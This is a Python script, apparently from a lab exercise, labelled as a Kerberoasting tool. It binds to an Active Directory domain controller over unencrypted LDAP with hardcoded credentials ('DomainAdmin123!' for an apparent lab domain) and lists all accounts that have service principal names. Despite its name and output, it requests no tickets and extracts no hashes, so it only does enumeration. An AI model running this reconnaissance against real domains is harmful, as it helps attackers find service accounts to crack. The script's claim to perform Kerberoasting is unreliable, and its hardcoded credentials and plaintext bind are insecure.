from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the domain controller via LDAP
        server = Server(dc_ip, use_ssl=False)
        conn = Connection(server, user=f"{username}@{domain}", password=password, authentication='NTLM')
        conn.bind()

        # Search for users with SPNs set
        conn.search(search_base="DC=" + ",".join(domain.split(".")),
                    search_filter="(servicePrincipalName=*)",
                    search_scope=SUBTREE,
                    attributes=ALL_ATTRIBUTES)

        kerberoastable_accounts = []

        # Extract kerberoastable accounts
        for entry in conn.entries:
            if entry.entry_attributes_as_dict.get('servicePrincipalName'):
                kerberoastable_accounts.append(entry.entry_dn)

        conn.unbind()

        if kerberoastable_accounts:
            print("Kerberoastable Accounts:")
            for account in kerberoastable_accounts:
                print(account)
        else:
            print("No kerberoastable accounts found.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)